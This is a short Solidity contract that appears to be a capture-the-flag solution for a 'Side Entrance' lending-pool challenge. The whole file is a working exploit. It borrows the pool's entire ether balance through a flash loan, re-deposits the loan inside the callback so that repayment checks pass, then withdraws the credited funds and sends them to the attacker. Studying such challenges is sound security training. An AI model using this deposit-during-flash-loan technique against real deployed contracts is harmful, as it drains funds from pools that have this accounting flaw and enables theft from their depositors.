// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public pool;
    address public player;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        player = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(player).transfer(address(this).balance);
    }

    receive() external payable {}
}